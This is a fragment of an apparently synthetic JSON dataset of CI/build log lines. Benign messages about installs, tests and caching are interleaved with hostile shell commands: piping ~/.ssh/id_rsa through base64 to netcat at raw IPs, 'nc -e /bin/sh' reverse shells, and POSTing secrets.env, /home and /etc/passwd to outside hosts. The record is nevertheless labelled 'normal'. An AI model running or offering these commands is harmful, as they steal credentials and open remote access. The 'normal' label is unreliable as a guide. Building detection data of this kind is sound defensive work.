          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Installing lodash@5.14.0",
          "Installing eslint@1.18.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-6313",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 94.106.206.203 40147",
          "  PASS: test_api_health (393ms)",
          "Sending 185MB of data to cloud.services",
          "Installing eslint@1.0.0",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 64.175.23.249 1629",
          "\u2713 build completed",
          "[12:00:18] ERROR: Connection failed",
          "Cache hit for key-3171",
          "Sending 456MB of data to example.com",
          "\u2713 build completed",
          "Installing axios@2.4.0",
          "Cache hit for key-1573",
          "Compiling src/main.py...",
          "Installing lodash@5.3.0",
          "Step 1/10: Building",
          "  PASS: test_user_create (146ms)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Exception: RuntimeError",
          "\u2713 test completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 4.30.46.112 50088",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "nc -e /bin/sh 137.135.66.110 17459",
          "Cache hit for key-8476",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 2.7.29.34 7517",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "nc -e /bin/sh 56.27.123.59 14560",
          "  PASS: test_cache_hit (493ms)",
          "Compiling src/utils.go...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 10.130.2.177 53394",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "=== Step restore_cache completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}